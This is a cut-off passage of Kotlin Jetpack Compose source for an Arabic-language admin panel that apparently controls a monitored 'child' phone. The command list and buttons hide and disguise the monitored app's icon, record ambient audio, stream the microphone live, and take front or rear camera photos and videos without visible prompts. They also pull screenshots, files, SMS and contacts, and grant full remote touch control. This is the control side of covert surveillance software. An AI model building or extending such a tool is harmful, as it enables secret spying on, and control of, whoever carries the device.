                                .padding(horizontal = 16.dp, vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Text("إخفاء أيقونة الطفل", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color.White)
                        }
                    }
                    Button(
                        onClick = { viewModel.runCommand("hide_app", mapOf("packageName" to "com.aistudio.commander.bxyz", "hidden" to false)) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
                        contentPadding = PaddingValues(),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.weight(1f).height(44.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .background(Brush.linearGradient(listOf(Color(0xFF10B981), Color(0xFF059669))))
                                .padding(horizontal = 16.dp, vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Text("إظهار أيقونة الطفل", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color.White)
                        }
                    }
                }
            }
        }

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(14.dp)) {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                shape = RoundedCornerShape(16.dp),
                elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
                border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
                modifier = Modifier.weight(1f).shadow(
                    elevation = 8.dp, 
                    shape = RoundedCornerShape(16.dp), 
                    spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
                    ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
                )
            ) {
                Column(modifier = Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Box(contentAlignment = Alignment.Center) {
                        Icon(getBatteryIcon(device.battery), null, tint = getBatteryColor(device.battery), modifier = Modifier.size(32.dp))
                        if (device.isCharging) {
                            Icon(Icons.Default.Bolt, null, tint = Color(0xFFFFEB3B), modifier = Modifier.size(18.dp).offset(y = 2.dp))
                        }
                    }
                    Spacer(modifier = Modifier.height(6.dp))
                    Text("البطارية", color = Color(0xFF6B7280), fontSize = 11.sp)
                    Text("${device.battery}%", color = Color(0xFF1F2937), fontSize = 16.sp, fontWeight = FontWeight.Bold)
                }
            }

            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                shape = RoundedCornerShape(16.dp),
                elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
                border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
                modifier = Modifier.weight(1f).shadow(
                    elevation = 8.dp, 
                    shape = RoundedCornerShape(16.dp), 
                    spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
                    ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
                )
            ) {
                val networkIcon = when (device.networkType?.uppercase()) {
                    "WIFI" -> Icons.Default.Wifi
                    "5G" -> Icons.Default.SignalCellularAlt
                    "4G", "LTE" -> Icons.Default.SignalCellular4Bar
                    else -> Icons.Default.NetworkCell
                }
                Column(modifier = Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(networkIcon, null, tint = Color(0xFF2196F3), modifier = Modifier.size(32.dp))
                    Spacer(modifier = Modifier.height(6.dp))
                    val displayNetType = if (device.networkType?.contains("cellular", ignoreCase = true) == true) "Phone data" else device.networkType
                    val networkText = if (displayNetType != null && device.carrierName != null) {
                        "${displayNetType} (${device.carrierName})"
                    } else {
                        displayNetType ?: device.carrierName ?: "---"
                    }
                    Text("الشبكة", color = Color(0xFF6B7280), fontSize = 11.sp)
                    Text(networkText, color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center, maxLines = 1)
                }
            }

            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                shape = RoundedCornerShape(16.dp),
                elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
                border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
                modifier = Modifier.weight(1f).shadow(
                    elevation = 8.dp, 
                    shape = RoundedCornerShape(16.dp), 
                    spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
                    ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
                )
            ) {
                val usagePercentage = if (device.storageTotal > 0) ((device.storageUsed.toDouble() / device.storageTotal.toDouble()) * 100).toInt() else 0
                Column(modifier = Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Default.Storage, null, tint = Color(0xFF9155FF), modifier = Modifier.size(32.dp))
                    Spacer(modifier = Modifier.height(6.dp))
                    Text("التخزين", color = Color(0xFF6B7280), fontSize = 11.sp)
                    Text("$usagePercentage%", color = Color(0xFF1F2937), fontSize = 16.sp, fontWeight = FontWeight.Bold)
                }
            }
        }

        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            shape = RoundedCornerShape(20.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
            border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
            modifier = Modifier.fillMaxWidth().shadow(
                elevation = 8.dp, 
                shape = RoundedCornerShape(20.dp), 
                spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
                ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
            )
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("تفاصيل مساحة التخزين", color = Color(0xFF1F2937), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                Spacer(modifier = Modifier.height(6.dp))
                val usedGb = if (device.storageUsed > 1_000_000) 
                    String.format(Locale.ENGLISH, "%.2f", device.storageUsed.toDouble() / (1024.0 * 1024.0 * 1024.0))
                else 
                    String.format(Locale.ENGLISH, "%.2f", device.storageUsed.toDouble())
                
                val totalGb = if (device.storageTotal > 1_000_000) 
                    String.format(Locale.ENGLISH, "%.2f", device.storageTotal.toDouble() / (1024.0 * 1024.0 * 1024.0))
                else 
                    String.format(Locale.ENGLISH, "%.2f", device.storageTotal.toDouble())
                val progress = if (device.storageTotal > 0) (device.storageUsed.toFloat() / device.storageTotal.toFloat()) else 0f
                LinearProgressIndicator(
                    progress = { progress },
                    color = Color(0xFF9155FF),
                    trackColor = Color(0xFFE5E7EB),
                    modifier = Modifier.fillMaxWidth().height(8.dp).clip(RoundedCornerShape(4.dp))
                )
                Spacer(modifier = Modifier.height(6.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                    Text("المستخدم: $usedGb جيجا", color = Color(0xFF6B7280), fontSize = 11.sp)
                    Text("الإجمالي: $totalGb جيجا", color = Color(0xFF6B7280), fontSize = 11.sp)
                }
            }
        }

        // التحكم في فلاش الهاتف (الكشاف) المدمج في الرئيسية
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            shape = RoundedCornerShape(20.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
            border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
            modifier = Modifier.fillMaxWidth().shadow(
                elevation = 8.dp, 
                shape = RoundedCornerShape(20.dp), 
                spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
                ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
            )
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = Icons.Default.Bolt,
                        contentDescription = null,
                        tint = Color(0xFFFBC02D),
                        modifier = Modifier.size(24.dp)
                    )
                    Spacer(modifier = Modifier.width(12.dp))
                    Column {
                        Text("التحكم في فلاش الهاتف عن بعد", color = Color(0xFF111827), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        Text("تشغيل أو إطفاء كشاف الهاتف في أي وقت للسلامة والمتابعة", color = Color(0xFF6B7280), fontSize = 11.sp, fontWeight = FontWeight.Medium)
                    }
                }
                Spacer(modifier = Modifier.height(16.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(
                        onClick = { viewModel.turnOnFlashlight() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
                        contentPadding = PaddingValues(),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.weight(1f).height(44.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .background(Brush.linearGradient(listOf(Color(0xFF4CAF50), Color(0xFF2E7D32))))
                                .padding(horizontal = 16.dp, vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.FlashOn, null, modifier = Modifier.size(16.dp), tint = Color.White)
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("اشعل الفلاش", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Color.White)
                            }
                        }
                    }
                    Button(
                        onClick = { viewModel.turnOffFlashlight() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
                        contentPadding = PaddingValues(),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.weight(1f).height(44.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .background(Brush.linearGradient(listOf(Color(0xFFEF4444), Color(0xFFC62828))))
                                .padding(horizontal = 16.dp, vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.FlashOff, null, modifier = Modifier.size(16.dp), tint = Color.White)
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("إطفاء الفلاش", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = Color.White)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun DeviceCommandsTab(
    device: Device,
    viewModel: AdminViewModel,
    openCommandDetails: String?,
    onOpenCommand: (String?) -> Unit
) {
    if (openCommandDetails == null) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(start = 14.dp, end = 14.dp, top = 14.dp, bottom = 100.dp)
                .verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Text("قائمة الأوامر الفورية", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
            
            val cmdItems = listOf(
                CommandItemInfo("media_gallery", "معرض الوسائط والملفات", "استعراض الصور، الفيديوهات والتسجيلات المكتشفة", Icons.Default.PhotoLibrary, Color(0xFF3F51B5)),
                CommandItemInfo("audio_record", "تسجيل الصوت المحيطي", "تسجيل مقطع صوتي محيطي بالوقت الحقيقي والاستماع إليه", Icons.Default.Mic, Color(0xFF00E5FF)),
                CommandItemInfo("mic_stream", "بث الميكروفون المباشر", "الاستماع لميكروفون هاتف الطفل بالوقت الحقيقي بصوت نقي", Icons.Default.RecordVoiceOver, Color(0xFFEF4444)),
                CommandItemInfo("file_explorer", "مستكشف ملفات الهاتف", "استكشاف وتنزيل ملفات جهاز الطفل بالكامل", Icons.Default.FolderOpen, Color(0xFFFFD54F)),
                CommandItemInfo("apps", "قائمة التطبيقات وحزمها", "الاطلاع وفلترة التطبيقات المنصبة على الهاتف للأمان", Icons.Default.Apps, Color(0xFFFF4081)),
                CommandItemInfo("sms", "الرسائل وتنبيهات الأمان", "مزامنة الرسائل النصية والتنبيهات المكتشفة بالهاتف", Icons.Default.Sms, Color(0xFFFF9100)),
                CommandItemInfo("contacts", "سجل جهات الاتصال", "عرض الأسماء والأرقام المسجلة في هاتف الطفل", Icons.Default.ContactPhone, Color(0xFF9155FF)),
                CommandItemInfo("remote_control", "التحكم عن بعد (لمس)", "بث مباشر للشاشة مع إمكانية التحكم الكامل باللمس", Icons.Default.SettingsRemote, Color(0xFF2196F3)),
                CommandItemInfo("volume_control", "التحكم في الصوت", "التحكم في مستوى صوت هاتف الطفل وتعديله عن بعد", Icons.Default.VolumeUp, Color(0xFFFFA726)),
                CommandItemInfo("audio_control", "تشغيل الأصوات التنبيهية", "تشغيل أصوات تنبيهية وتنبيهات حية مسبقة على هاتف الطفل", Icons.Default.MusicNote, Color(0xFFE040FB)),
                CommandItemInfo("send_message", "إرسال رسالة فورية", "إرسال رسالة تظهر كإشعار على هاتف الطفل", Icons.Default.Chat, Color(0xFF00C853)),
                CommandItemInfo("change_icon", "استبدال أيقونة التطبيق", "تغيير شكل واسم أيقونة تطبيق الطفل من ضمن القائمة", Icons.Default.Apps, Color(0xFFE91E63))
            )

            cmdItems.forEach { cmd ->
                Card(
                    onClick = { onOpenCommand(cmd.id) },
                    colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                    shape = RoundedCornerShape(16.dp),
                    elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
                    border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
                    modifier = Modifier.fillMaxWidth().shadow(
                        elevation = 6.dp, 
                        shape = RoundedCornerShape(16.dp), 
                        spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
                        ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
                    )
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(14.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier.size(38.dp).clip(RoundedCornerShape(6.dp)).background(cmd.color.copy(alpha = 0.15f)),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(cmd.icon, null, tint = cmd.color, modifier = Modifier.size(20.dp))
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text(cmd.title, color = Color(0xFF1F2937), fontSize = 13.sp, fontWeight = FontWeight.Bold)
                            Text(cmd.description, color = Color(0xFF6B7280), fontSize = 10.sp, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        }
                        Icon(Icons.Default.ArrowForwardIos, null, tint = Color(0xFF6B7280), modifier = Modifier.size(12.dp))
                    }
                }
            }
        }
    } else {
        Column(modifier = Modifier.fillMaxSize()) {
            Box(modifier = Modifier.weight(1f).fillMaxWidth()) {
                when (openCommandDetails) {
                    "screenshot" -> ScreenshotRequirementsPage(viewModel)
                    "media_gallery" -> DeviceMediaGalleryTab(viewModel)
                    "audio_record" -> AudioRecordRequirementsPage(viewModel)
                    "mic_stream" -> MicStreamRequirementsPage(viewModel)
                    "live_stream" -> LiveStreamRequirementsPage(viewModel)
                    "file_explorer" -> RemoteFileExplorerTab(viewModel)
                    "apps" -> InstalledAppsRequirementsPage(viewModel)
                    "sms" -> SmsAndSecurityAlertsTab(viewModel)
                    "contacts" -> ContactsTab(viewModel)
                    "remote_control" -> RemoteControlTab(viewModel)
                    "volume_control" -> VolumeControlTab(viewModel)
                    "audio_control" -> AudioControlTab(viewModel)
                    "send_message" -> NotificationTab(viewModel)
                    "camera_live" -> CameraLiveTab(viewModel)
                    "change_icon" -> ChangeIconRequirementsPage(viewModel)
                }
            }
        }
    }
}

data class CommandItemInfo(
    val id: String,
    val title: String,
    val description: String,
    val icon: ImageVector,
    val color: Color
)

@Composable
fun EmptyHistoryPlaceholder(text: String) {
    Box(
        modifier = Modifier
            .fillMaxWidth()
            .height(120.dp)
            .background(Color(0xFFFFFFFF), RoundedCornerShape(12.dp))
            .border(BorderStroke(1.dp, Color(0xFFE5E7EB)), RoundedCornerShape(12.dp)),
        contentAlignment = Alignment.Center
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.History, null, tint = Color(0xFF6B7280), modifier = Modifier.size(32.dp))
            Spacer(Modifier.height(8.dp))
            Text(text, color = Color(0xFF6B7280), fontSize = 12.sp)
        }
    }
}

@Composable
fun ScreenshotRequirementsPage(viewModel: AdminViewModel) {
    val screenshots by viewModel.screenshots.collectAsState()
    val cameraPhotos by viewModel.cameraPhotos.collectAsState()
    val cameraVideos by viewModel.cameraVideos.collectAsState()
    val context = LocalContext.current
    var fullscreenBitmap by remember { mutableStateOf<Bitmap?>(null) }
    var playingVideo by remember { mutableStateOf<MediaItem?>(null) }
    var selectedSubTab by remember { mutableIntStateOf(0) }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        Row(modifier = Modifier.fillMaxWidth().background(Color(0xFFFFFFFF), RoundedCornerShape(12.dp)).padding(4.dp)) {
            listOf("الشاشة" to 0, "الصور" to 1, "الفيديو" to 2).forEach { (label, index) ->
                val isSelected = selectedSubTab == index
                Box(modifier = Modifier.weight(1f).height(36.dp).clip(RoundedCornerShape(8.dp)).background(if (isSelected) Color(0xFF9155FF) else Color.Transparent).clickable { selectedSubTab = index }, contentAlignment = Alignment.Center) {
                    Text(label, color = if (isSelected) Color(0xFF1F2937) else Color(0xFF6B7280), fontSize = 11.sp)
                }
            }
        }
        
        Spacer(Modifier.height(16.dp))

        when (selectedSubTab) {
            0 -> {
                Button(onClick = { viewModel.requestScreenshot() }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))) {
                    Icon(Icons.Default.Screenshot, null, modifier = Modifier.size(18.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("التقاط شاشة الطفل")
                }
                Spacer(Modifier.height(16.dp))
                Box(Modifier.weight(1f)) {
                    BentoMediaGrid(items = screenshots, category = "screenshots", onDelete = { viewModel.deleteMediaItem("screenshots", it.id) }, onExpand = { fullscreenBitmap = it }, onSave = { bmp -> saveBitmapToGallery(context, bmp, "screenshot_${System.currentTimeMillis()}") })
                }
            }
            1 -> {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { viewModel.requestPhoto(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636))) {
                        Text("خلفية")
                    }
                    Button(onClick = { viewModel.requestPhoto(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF))) {
                        Text("أمامية", color = Color.Black)
                    }
                }
                Spacer(Modifier.height(16.dp))
                Box(Modifier.weight(1f)) {
                    BentoMediaGrid(items = cameraPhotos, category = "camera_photos", onDelete = { viewModel.deleteMediaItem("camera_photos", it.id) }, onExpand = { fullscreenBitmap = it }, onSave = { bmp -> saveBitmapToGallery(context, bmp, "photo_${System.currentTimeMillis()}") })
                }
            }
            2 -> {
                Column(modifier = Modifier.weight(1f)) {
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Button(onClick = { viewModel.requestVideo(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444))) {
                            Text("فيديو خلفي")
                        }
                        Button(onClick = { viewModel.requestVideo(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9100))) {
                            Text("فيديو أمامي", color = Color.Black)
                        }
                    }
                    Spacer(Modifier.height(16.dp))
                    LazyColumn(modifier = Modifier.fillMaxSize(), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        items(cameraVideos) { video ->
                            Card(
                                modifier = Modifier.fillMaxWidth().clickable { playingVideo = video },
                                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                                border = BorderStroke(1.dp, Color(0xFFE5E7EB))
                            ) {
                                Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                                    Icon(Icons.Default.PlayCircle, null, tint = Color(0xFFEF4444))
                                    Spacer(Modifier.width(12.dp))
                                    Column(modifier = Modifier.weight(1f)) {
                                        Text(if (video.cameraType == "front") "فيديو من الكاميرا الأمامية" else "فيديو من الكاميرا الخلفية", color = Color(0xFF1F2937), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                        Text(SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault()).format(Date(video.timestamp)), color = Color(0xFF6B7280), fontSize = 10.sp)
                                    }
                                    IconButton(onClick = { viewModel.deleteMediaItem("video_records", video.id) }) {
                                        Icon(Icons.Default.Delete, "حذف", tint = Color(0xFF6B7280), modifier = Modifier.size(18.dp))
                                    }
                                }
                            }
                        }
                        if (cameraVideos.isEmpty()) {
                            item {
                                Box(Modifier.fillMaxWidth().height(100.dp), contentAlignment = Alignment.Center) {
                                    Text("لم يتم استلام أي مقاطع فيديو بعد", color = Color(0xFF6B7280), fontSize = 12.sp)
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    fullscreenBitmap?.let { bmp ->
        Dialog(onDismissRequest = { fullscreenBitmap = null }) {
            Box(Modifier.fillMaxSize().clickable { fullscreenBitmap = null }.background(Color.Black.copy(0.9f)), contentAlignment = Alignment.Center) {
                Image(bmp.asImageBitmap(), null, modifier = Modifier.fillMaxWidth(0.95f), contentScale = ContentScale.Fit)
            }
        }
    }

    playingVideo?.let { video ->
        VideoPlayerDialog(
            videoBase64 = video.base64,
            onDismiss = { playingVideo = null },
            onDownload = {
                val success = saveVideoToDownloads(context, video.base64, "video_${video.timestamp}")
                if (success) {
                    Toast.makeText(context, "تم حفظ الفيديو بجهازك (في الأفلام)", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(context, "فشل حفظ الفيديو", Toast.LENGTH_SHORT).show()
                }
            }
        )
    }
}

@Composable
fun BentoMediaGrid(
    items: List<MediaItem>,
    category: String,
    onDelete: (MediaItem) -> Unit,
    onExpand: (Bitmap) -> Unit,
    onSave: (Bitmap) -> Unit
) {
    val context = LocalContext.current
    
    if (items.isEmpty()) {
        Box(modifier = Modifier.fillMaxWidth().height(100.dp), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text("لا توجد وسائط متوفرة حالياً", color = Color(0xFF6B7280), fontSize = 12.sp)
                Spacer(Modifier.height(4.dp))
                Text("لم يرسل تطبيق الطفل صوراً أو لم يتم العثور على الأعمدة (response_data, image_code, result) في الجدول", color = Color(0xFF9CA3AF), fontSize = 9.sp, textAlign = TextAlign.Center, modifier = Modifier.padding(horizontal = 16.dp))
            }
        }
        return
    }

    LazyVerticalGrid(
        columns = GridCells.Fixed(2),
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(4.dp),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        items(items) { item ->
            var isDecodingError by remember { mutableStateOf(false) }
            val bitmap by produceState<Bitmap?>(initialValue = null, item.base64) {
                value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
                    val bmp = item.toBitmap()
                    if (bmp == null) {
                        isDecodingError = true
                    }
                    bmp
                }
            }
            
            var showOptions by remember { mutableStateOf(false) }

            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier.fillMaxWidth().aspectRatio(1f)
            ) {
                Box(modifier = Modifier.fillMaxSize()) {
                    if (bitmap != null) {
                        Image(
                            bitmap!!.asImageBitmap(),
                            null,
                            modifier = Modifier.fillMaxSize().clickable { onExpand(bitmap!!) },
                            contentScale = ContentScale.Crop
                        )
                    } else if (isDecodingError) {
                        Box(modifier = Modifier.fillMaxSize().background(Color(0xFFFFEBEE)).padding(4.dp), contentAlignment = Alignment.Center) {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                Icon(Icons.Default.Error, null, tint = Color(0xFFEF4444), modifier = Modifier.size(24.dp))
                                Spacer(Modifier.height(4.dp))
                                Text("صورة تالفة", color = Color(0xFFEF4444), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Spacer(Modifier.height(2.dp))
                                Text(item.lastDecodeError ?: "Unknown error", color = Color(0xFFEF4444), fontSize = 8.sp, maxLines = 4, textAlign = TextAlign.Center)
                            }
                        }
                    } else {
                        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                            CircularProgressIndicator(modifier = Modifier.size(24.dp), color = Color(0xFF9155FF), strokeWidth = 2.dp)
                        }
                    }

                    // Overlay info
                    Box(
                        modifier = Modifier
                            .align(Alignment.BottomStart)
                            .fillMaxWidth()
                            .background(androidx.compose.ui.graphics.Brush.verticalGradient(listOf(Color.Transparent, Color.Black.copy(alpha = 0.7f))))
                            .padding(6.dp)
                    ) {
                        Column {
                            if (item.cameraType != null) {
                                Text(
                                    if(item.cameraType == "front") "أمامية" else "خلفية",
                                    color = Color.Cyan,
                                    fontSize = 8.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                            Text(
                                SimpleDateFormat("h:mm a, d/M", Locale.getDefault()).format(Date(item.timestamp)),
                                color = Color(0xFF1F2937),
                                fontSize = 8.sp
                            )
                        }
                    }

                    // Action buttons overlay
                    Row(
                        modifier = Modifier.align(Alignment.TopEnd).padding(4.dp),
                        horizontalArrangement = Arrangement.spacedBy(4.dp)
                    ) {
                        IconButton(
                            onClick = { showOptions = true },
                            modifier = Modifier.size(28.dp).background(Color.Black.copy(alpha = 0.4f), CircleShape)
                        ) {
                            Icon(Icons.Default.MoreVert, null, tint = Color(0xFF1F2937), modifier = Modifier.size(16.dp))
                        }
                    }
                }
            }
            
            if (showOptions) {
                Dialog(onDismissRequest = { showOptions = false }) {
                    Card(
                        colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                        shape = RoundedCornerShape(16.dp),
                        border = BorderStroke(1.dp, Color(0xFFE5E7EB))
                    ) {
                        Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(12.dp)) {
                            Text("خيارات الوسائط", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold)
                            
                            HorizontalDivider(color = Color(0xFFE5E7EB))
                            
                            Button(
                                onClick = { 
                                    bitmap?.let { onSave(it) }
                                    showOptions = false
                                },
                                modifier = Modifier.fillMaxWidth(),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636))
                            ) {
                                Icon(Icons.Default.Download, null, modifier = Modifier.size(18.dp))
                                Spacer(Modifier.width(8.dp))
                                Text("حفظ في الاستوديو")
                            }

                            Button(
                                onClick = { 
                                    onDelete(item)
                                    showOptions = false
                                },
                                modifier = Modifier.fillMaxWidth(),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444))
                            ) {
                                Icon(Icons.Default.DeleteForever, null, modifier = Modifier.size(18.dp))
                                Spacer(Modifier.width(8.dp))
                                Text("حذف نهائي")
                            }
                            
                            OutlinedButton(onClick = { showOptions = false }, modifier = Modifier.fillMaxWidth()) {
                                Text("إلغاء", color = Color(0xFF1F2937))
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun MicStreamRequirementsPage(viewModel: AdminViewModel) {
    val micStreamState by viewModel.micStreamState.collectAsState()
    
    val isActive = micStreamState.isActive
    val isLoading = micStreamState.isLoading

    // Pulse animation when active
    val infiniteTransition = rememberInfiniteTransition(label = "micPulse")
    val pulseScale by infiniteTransition.animateFloat(
        initialValue = 1f,
        targetValue = if (isActive || isLoading) 1.2f else 1f,
        animationSpec = infiniteRepeatable(
            animation = tween(1000, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "micPulseScale"
    )

    val pulseAlpha by infiniteTransition.animateFloat(
        initialValue = 0.5f,
        targetValue = if (isActive || isLoading) 0f else 0.5f,
        animationSpec = infiniteRepeatable(
            animation = tween(1000, easing = LinearEasing),
            repeatMode = RepeatMode.Restart
        ),
        label = "micPulseAlpha"
    )

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF0B0F19))
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        item {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
                border = BorderStroke(1.dp, Color(0xFF334155)),
                shape = RoundedCornerShape(24.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(
                    modifier = Modifier.padding(24.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Box(
                        modifier = Modifier
                            .size(100.dp)
                            .padding(8.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        if (isActive || isLoading) {
                            Box(
                                modifier = Modifier
                                    .fillMaxSize()
                                    .scale(pulseScale)
                                    .background(Color(0xFFEF4444).copy(alpha = pulseAlpha), CircleShape)
                            )
                        }
                        Box(
                            modifier = Modifier
                                .size(64.dp)
                                .background(if (isActive) Color(0xFFEF4444) else Color(0xFF334155), CircleShape),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.Mic,
                                contentDescription = null,
                                tint = Color.White,
                                modifier = Modifier.size(32.dp)
                            )
                        }
                    }
                    Spacer(Modifier.height(16.dp))
                    Text(
                        text = "بث الميكروفون الحي",
                        color = Color.White,
                        fontSize = 20.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(Modifier.height(8.dp))
                    Text(
                        text = "يتيح لك هذا الخيار الاستماع لما يدور حول هاتف الطفل في الوقت الفعلي وبجودة عالية عبر بث مباشر للصوت.",
                        color = Color(0xFF94A3B8),
                        fontSize = 13.sp,
                        textAlign = TextAlign.Center,
                        lineHeight = 20.sp,
                        modifier = Modifier.padding(horizontal = 12.dp)
                    )
                    Spacer(Modifier.height(24.dp))
                    
                    if (isActive) {
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFF166534).copy(alpha = 0.2f)),
                            border = BorderStroke(1.dp, Color(0xFF166534)),
                            shape = RoundedCornerShape(12.dp),
                            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp)
                        ) {
                            Row(
                                modifier = Modifier.padding(12.dp),
                                verticalAlignment = Alignment.CenterVertically,
